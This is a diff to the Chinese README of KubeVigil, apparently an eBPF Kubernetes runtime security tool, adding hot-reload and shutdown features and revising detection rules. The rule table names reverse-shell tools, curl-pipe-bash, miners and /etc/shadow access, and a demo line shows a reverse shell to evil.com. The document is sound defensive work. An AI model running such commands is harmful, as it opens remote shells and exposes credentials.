@@ -89,15 +89,21 @@ KubeVigil 是一个基于 **eBPF** 的 Kubernetes 运行时安全工具。它直
 
 ### 监控能力
 
-- **进程执行监控 (execve)** — 捕获容器内所有新启动的进程
+- **进程执行监控 (execve)** — 捕获容器内所有新启动的进程，含父进程追踪（PPID）
 - **文件访问监控 (open)** — 监控对敏感文件的非授权读取
-- **网络连接监控 (connect)** — 捕获恶意的外连请求
+- **网络连接监控 (connect)** — 捕获恶意的外连请求（自动处理网络字节序）
+
+### 运维能力
+
+- **规则热重载** — 发送 `SIGHUP` 信号即可重载规则，无需重启 Agent
+- **日志级别控制** — 支持 debug/info/warn/error 四级日志
+- **优雅关闭** — 收到 SIGINT/SIGTERM 后优雅关闭 Ring Buffer 和探针
 
 ### 内置安全规则
 
 | 规则 | 类型 | 严重等级 | 响应动作 | 描述 |
 |---|---|---|---|---|
-| `reverse-shell-detected` | execve | 🔴 Critical | Kill Pod | 检测 `/bin/bash`、`nc`、`socat` 等反弹 Shell |
+| `reverse-shell-detected` | execve | 🔴 Critical | Kill Pod | 检测 `nc`、`socat` 等网络工具 + `/dev/tcp/` 可疑参数 |
 | `suspicious-download` | execve | 🟠 High | Label | 检测 `curl \| bash` 等可疑下载行为 |
 | `crypto-mining` | execve | 🔴 Critical | Kill Pod | 检测 `xmrig`、`minerd` 等挖矿程序 |
 | `sensitive-file-access` | open | 🟠 High | Label | 检测对 `/etc/shadow`、K8s Secret 的访问 |
@@ -150,6 +156,18 @@ kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil -f
 
 ```bash
 helm uninstall kubevigil --namespace kubevigil
+```
+
+### 规则热重载
+
+运行中的 Agent 支持通过 SIGHUP 信号热重载规则，无需重启：
+
+```bash
+# 查找 Agent PID
+kubectl exec -n kubevigil <pod-name> -- kill -HUP 1
+
+# 或者直接修改 ConfigMap，Agent 会自动检测变化
+kubectl edit configmap -n kubevigil kubevigil
 ```
 
 ---
@@ -389,7 +407,7 @@ bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'
 KubeVigil 输出：
 
 ```
-[ALERT] [EXECVE] 2024-01-15 10:23:45 | Namespace: default, Pod: nginx-xyz | 异常执行了黑名单进程: /bin/bash | Rule: reverse-shell-detected | Severity: critical | Action: kill
+[ALERT] [EXECVE] 2024-01-15 10:23:45 | Namespace: default, Pod: nginx-xyz | 异常执行了黑名单进程: nc | Rule: reverse-shell-detected | Severity: critical | Action: kill
 [K8s] 已终止 Pod: default/nginx-xyz
 ```
 
@@ -429,6 +447,7 @@ KubeVigil 输出：
 - [x] **阶段二：规则化** — YAML 规则引擎 + 黑白名单
 - [x] **阶段三：自动响应** — K8s API 集成 + 隔离/终止
 - [x] **阶段四：部署** — Dockerfile + Helm Chart
+- [x] **阶段四+：加固** — 内存对齐修复 + PID 映射 + 规则热重载 + 优雅关闭
 - [ ] **阶段五：Web Dashboard** — 轻量级 Web 界面展示告警与统计
 - [ ] **阶段六：威胁情报集成** — 接入外部威胁情报源
 - [ ] **阶段七：eBPF Map 状态追踪** — 进程血缘关系追踪
